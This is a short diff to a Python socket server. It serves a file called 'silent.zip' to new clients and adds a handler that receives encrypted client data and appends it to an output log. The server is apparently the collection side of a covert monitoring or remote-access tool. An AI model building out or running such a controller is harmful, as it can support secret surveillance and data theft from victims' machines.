@@ -42,7 +42,21 @@ def main():
             FileTransfer.receive(client_socket, encryption_key, data, './output/')
         elif (request == '<newpc>'):
             FileTransfer.send(client_socket, encryption_key, 'silent.zip', './')
+        elif (request == '<doutput>'):
+            print('<doutput> now')
+            data = 'temp.txt:' + FileTransfer.decrypt(client_socket.recv(1024), encryption_key).decode().split(':')[1]
+            print(data)
+            FileTransfer.receive(client_socket, encryption_key, data, './output/')
+            print('got default')
+            client_socket.close()
+            with open('./output/default.txt', 'a') as data:
+                with open('./output/temp.txt', 'r') as f:
+                    data.write(f.read())
+            os.remove('./output/temp.txt')
+        elif (request == '<update>'):
+            print('update')
         client_socket.close()
+        print('closed connection')
 
 
 if __name__ == '__main__':
